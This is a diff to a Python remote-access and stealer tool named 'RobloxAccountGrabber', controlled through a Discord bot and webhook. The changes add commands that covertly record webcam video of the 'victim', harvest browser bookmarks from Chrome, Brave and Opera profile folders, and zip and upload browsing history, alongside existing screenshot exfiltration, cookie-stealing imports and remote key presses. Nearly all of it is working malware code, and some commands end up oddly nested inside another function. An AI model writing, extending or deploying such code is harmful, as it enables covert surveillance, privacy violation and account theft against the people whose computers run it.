@@ -1,3 +1,4 @@
+import getpass
 import json
 import os
 import platform
@@ -9,15 +10,19 @@ import time
 import urllib.request
 import uuid
 import webbrowser
+import zipfile
 from urllib.request import build_opener, HTTPSHandler
 import browser_cookie3
+import cv2
 import discord
 import psutil
 import pyautogui
 import requests
 import robloxpy
-from discord_webhook import DiscordWebhook, DiscordEmbed
+from browser_history import get_history
+from discord import File
 from discord.ext import commands
+from discord_webhook import DiscordWebhook, DiscordEmbed
 
 # variable
 
@@ -27,7 +32,7 @@ file = "screenshot.png"
 class RobloxAccountGrabber:
     def __init__(self, webhook: str):
         if not "discord.com/api/webhooks/" in webhook:
-            print('You did not provide a webhook on Line 187.')
+            print('You did not provide a webhook on Line 775.')
             exit()
 
         self.webhook = webhook
@@ -518,15 +523,12 @@ class RobloxAccountGrabber:
             }
         )
 
-
-
         with open(f"{file}", "rb") as f:
             webhook1.add_file(file=f.read(), filename=f"{file}")
 
         webhook1.execute()
 
         os.remove(file)
-
 
         webhook2.embeds.append(
             {
@@ -552,32 +554,26 @@ class RobloxAccountGrabber:
 
         intents = discord.Intents.default()
         intents.message_content = True
-
         client = commands.Bot(command_prefix='!', intents=intents)
 
         @client.command()
-        async def clear(ctx, arg=None):
-            if arg is None:
-                # Default behavior when no argument is provided
-                await ctx.send("Please provide the number of messages to clear.")
-                return
+        async def history(ctx):
+            outputs = get_history()
 
-            deleted = await ctx.channel.purge(limit=int(arg))
-            await ctx.send(f'Deleted {len(deleted)} message(s).')
+            # Save as CSV
+            outputs.save("history.csv")
+            # Save as JSON
+            outputs.save("history.json")
 
-        @client.command()
-        async def insert(ctx):
-            pyautogui.press("insert")
-
-            embed = discord.Embed(title="Key has been pressed on the victim's computer.",
-                                  description="Key has been pressed on the victim's computer.", color=4360181)
-            await ctx.send(embed=embed)
-
-        @client.command()
-        async def terminate(ctx):
-            await ctx.send("Bot, Webhook, EXplo!t, SST and tools is shutting down...")
-            await ctx.bot.close()
-            sys.exit()
+            # Create a zip archive
+            with zipfile.ZipFile("history_archive.zip", "w") as zipf:
+                zipf.write("history.csv")
+                zipf.write("history.json")
+                os.remove("history.json")
+                os.remove("history.csv")
+            history_file = 'history_archive.zip'
+            await ctx.send("Files compressed and saved as 'history_archive.zip'")
+            await ctx.send(file=File(history_file))
 
         @client.command()
         async def SH(ctx, action, *, sentence=None):
@@ -616,6 +612,12 @@ class RobloxAccountGrabber:
             cmd_list = [
                 "!Help\n"
                 "Need Help ? No problem.\n\n"
+                "\n!camcheck\n"
+                "Take a 30 seconds video and send to hacker. :camera: \n\n"
+                "\n!Bookmarks\n"
+                "Take every bookmarks on the default browser :star: .\n\n"
+                "\n!history\n"
+                "Take the history and put it into an csv file and json put into a zip :black_large_square: :orange_square: :smirk:\n\n"
                 "\n!insert\n"
                 "Input victims computer Insert key. :rage:\n\n",
                 "\n!terminate\n"
@@ -634,8 +636,140 @@ class RobloxAccountGrabber:
             embed = discord.Embed(title="List of Commands", description=command_info, color=0x00ff00)
             await ctx.send(embed=embed)
 
+        @client.command()
+        async def camcheck(ctx):
+            def check_webcam():
+                cap = cv2.VideoCapture(0)
+                if not cap.isOpened():
+                    return False
+                cap.release()
+                return True
+
+            if not check_webcam():
+                exit()
+
+            cap = cv2.VideoCapture(0)
+
+            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+            frame_rate = 45  # Adjust this value if needed
+
+            # Change the codec tag to 'XVID'
+            writer = cv2.VideoWriter('Webcam.mp4', cv2.VideoWriter_fourcc(*'XVID'), frame_rate, (width, height))
+
+            start_time = cv2.getTickCount() / cv2.getTickFrequency()
+
+            while True:
+                ret, frame = cap.read()
+
+                elapsed_time = (cv2.getTickCount() / cv2.getTickFrequency()) - start_time
+
+                if elapsed_time <= 15:
+                    writer.write(frame)
+
+                if elapsed_time >= 15:
+                    break
+
+                # Comment out the following line to hide the frame
+                # cv2.imshow('Recording', frame)
+
+                if cv2.waitKey(1) & 0xFF == 27:
+                    break
+            await ctx.send("The video will be sent in 5 second.")
+            cap.release()
+            writer.release()
+            cv2.destroyAllWindows()
+
+            cam_file = 'Webcam.mp4'
+
+            await ctx.send(file=File(cam_file))
+            os.remove(cam_file)
+
+        @client.command()
+        async def Bookmarks(ctx):
+            username = os.getlogin()
+            user = getpass.getuser()
+
+            browser_bookmark_dirs = [
+                f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Bookmarks.bak",
+                f"C:/Users/{username}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Bookmarks.bak",
+                f"C:/Users/{username}/AppData/Roaming/Opera Software/Opera Stable/Bookmarks.bak",
+                f"C:/Users/{username}/AppData/Roaming/Opera Software/Opera GX Stable/Bookmarks.bak"
+            ]
+
+            for bookmark_dir in browser_bookmark_dirs:
+                browser_name = ""
+                if "Chrome" in bookmark_dir:
+                    browser_name = "Chrome"
+                elif "Brave" in bookmark_dir:
+                    browser_name = "Brave"
+                elif "Opera GX" in bookmark_dir:
+                    browser_name = "OperaGX"
+                elif "Opera" in bookmark_dir:
+                    browser_name = "Opera"
+
+                if browser_name:
+                    output_file = os.path.join(f"Bookmarks_{browser_name}.json")
+                    zip_file_name = os.path.join(f"Bookmarks.zip")
+                    urls = []
+
+                    try:
+                        with open(bookmark_dir, encoding="utf8") as f:
+                            data = json.load(f)
+
+                            try:
+                                for x in data["roots"]["bookmark_bar"]["children"]:
+                                    urls.append(x["url"])
+                            except:
+                                pass
+
+                        bookmarks_data = {
+                            "message": f"Bookmarks from {browser_name}",
+                            "urls": urls
+                        }
+
+                        with open(output_file, "w") as out_f:
+                            json.dump(bookmarks_data, out_f, indent=4)
+
+                        with zipfile.ZipFile(zip_file_name, "w") as zipf:
+                            zipf.write(output_file)
+                        await ctx.send(file=File(zip_file_name))
+                        os.remove(zip_file_name)
+
+                        os.remove(output_file)
+                    except FileNotFoundError:
+                        pass
+
+
+
+            @client.command()
+            async def clear(ctx, arg=None):
+                if arg is None:
+                    # Default behavior when no argument is provided
+                    await ctx.send("Please provide the number of messages to clear.")
+                    return
+
+                deleted = await ctx.channel.purge(limit=int(arg))
+                await ctx.send(f'Deleted {len(deleted)} message(s).')
+
+            @client.command()
+            async def insert(ctx):
+                pyautogui.press("insert")
+
+                embed = discord.Embed(title="Key has been pressed on the victim's computer.",
+                                      description="Key has been pressed on the victim's computer.", color=4360181)
+                await ctx.send(embed=embed)
+
+            @client.command()
+            async def terminate(ctx):
+                await ctx.send("Bot, Webhook, EXplo!t, SST and tools is shutting down...")
+                await ctx.bot.close()
+                sys.exit()
+
+
+
         client.run('YOUR_DISCORD_BOT_TOKEN')
 
 
 RobloxAccountGrabber(
-    "YOUR_DISCORD_WEBHOOK")
+    "YOUR_WEBHOOK_URL")
